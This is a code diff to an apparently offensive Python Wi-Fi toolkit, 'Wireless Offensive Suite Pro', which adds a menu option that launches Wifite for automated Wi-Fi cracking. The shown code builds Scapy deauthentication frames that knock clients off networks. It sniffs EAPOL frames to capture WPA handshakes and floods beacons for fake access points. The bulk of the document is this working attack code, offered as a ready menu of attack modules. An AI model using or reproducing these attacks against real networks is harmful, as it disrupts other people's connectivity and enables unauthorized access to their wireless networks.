@@ -2,6 +2,7 @@ import time
 import os
 import threading
 import sys
+import subprocess
 import questionary
 from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, sendp, sniff, wrpcap, conf
 from rich.console import Console
@@ -17,13 +18,10 @@ class WiFiSuite:
 
     def check_monitor_mode(self, iface):
         """Checks if the interface is actually in monitor mode."""
-        # Simple check: Scapy's conf.iface might differ, we check via system
         try:
-            # This is Linux specific; macOS handles monitor mode differently
             mode_path = f"/sys/class/net/{iface}/type"
             if os.path.exists(mode_path):
                 with open(mode_path, 'r') as f:
-                    # 803 is ARPHRD_IEEE80211_RADIOTAP (Monitor Mode)
                     if f.read().strip() != "803":
                         console.print(
                             f"[yellow][!] Warning: {iface} might not be in Monitor Mode.[/yellow]")
@@ -45,10 +43,8 @@ class WiFiSuite:
         Sends deauthentication frames to disconnect a client.
         Reason 7: Class 3 frame received from nonassociated station.
         """
-        # Packet from AP to Client
         pkt1 = RadioTap()/Dot11(addr1=target_mac, addr2=bssid,
                                 addr3=bssid)/Dot11Deauth(reason=7)
-        # Packet from Client to AP (Broadcast)
         pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=target_mac,
                                 addr3=bssid)/Dot11Deauth(reason=7)
 
@@ -68,14 +64,12 @@ class WiFiSuite:
                  "Starbucks_Unsecured", "FBI Surveillance Van"]
         pkts = []
         for s in ssids:
-            # Generate a random-ish MAC for each SSID
             mac = "00:11:22:{:02x}:{:02x}:{:02x}".format(
                 time.time_ns() % 255, time.time_ns() % 250, time.time_ns() % 245)
             dot11 = Dot11(type=0, subtype=8,
                           addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
             beacon = Dot11Beacon(cap="ESS+privacy")
             essid = Dot11Elt(ID="SSID", info=s, len=len(s))
-            # Tagged parameters for frequency/channel (Channel 1)
             dsset = Dot11Elt(ID="DSset", info="\x01")
             pkts.append(RadioTap()/dot11/beacon/essid/dsset)
 
@@ -96,7 +90,6 @@ class WiFiSuite:
         """
         console.print(f"[*] Monitoring {bssid} for WPA Handshake...")
 
-        # Start channel hopper in background to ensure we hit the right frequency
         self.stop_hopping.clear()
         hopper = threading.Thread(
             target=self.channel_hopper, args=(iface,), daemon=True)
@@ -106,7 +99,6 @@ class WiFiSuite:
 
         def packet_handler(pkt):
             if pkt.haslayer(Dot11):
-                # Check for EAPOL frames (0x888e)
                 if pkt.haslayer('EAPOL'):
                     captured_handshakes.append(pkt)
                     console.print(
@@ -129,27 +121,59 @@ class WiFiSuite:
         finally:
             self.stop_hopping.set()
 
+    def run_wifite(self):
+        """Pro Feature: Automated WiFi Hacking via Wifite"""
+        console.print("[*] Checking for Wifite installation...")
+        if not os.path.exists("/usr/sbin/wifite") and not os.path.exists("/usr/bin/wifite") and subprocess.call(["which", "wifite"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
+            console.print("[bold red][!] Wifite is not installed.[/bold red]")
+            console.print(
+                "[white]Install it via: sudo apt install wifite[/white]")
+            return
+
+        console.print(
+            "[bold green][+] Launching Wifite Automated Attack Engine...[/bold green]")
+        console.print(
+            "[dim]Press Ctrl+C to exit Wifite and return to Davoid.[/dim]")
+        time.sleep(2)
+
+        try:
+            # Yield full terminal control to Wifite
+            subprocess.call(["sudo", "wifite"])
+        except Exception as e:
+            console.print(f"[red][!] Error running Wifite: {e}[/red]")
+
     def run(self):
         if os.getuid() != 0:
             return console.print("[red][!] Root required for raw socket WiFi operations.[/red]")
 
         draw_header("Wireless Offensive Suite Pro")
+
+        choice = questionary.select(
+            "Select Attack Module:",
+            choices=[
+                "1. Automated WiFi Hacking (Wifite)",
+                "2. Deauth Target (Kick users)",
+                "3. Capture WPA Handshake",
+                "4. Beacon Flood (Fake APs)"
+            ],
+            style=Q_STYLE
+        ).ask()
+
+        if not choice:
+            return
+
+        # Wifite handles its own interface selection, so we bypass the manual prompt
+        if "Wifite" in choice:
+            self.run_wifite()
+            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+            return
+
         iface = questionary.text(
             "Monitor Interface (e.g., wlan0mon):", style=Q_STYLE).ask()
         if not iface:
             return
 
         self.check_monitor_mode(iface)
-
-        choice = questionary.select(
-            "Select Attack Module:",
-            choices=[
-                "1. Deauth Target (Kick users)",
-                "2. Capture WPA Handshake",
-                "3. Beacon Flood (Fake APs)"
-            ],
-            style=Q_STYLE
-        ).ask()
 
         if "Deauth" in choice:
             target = questionary.text(
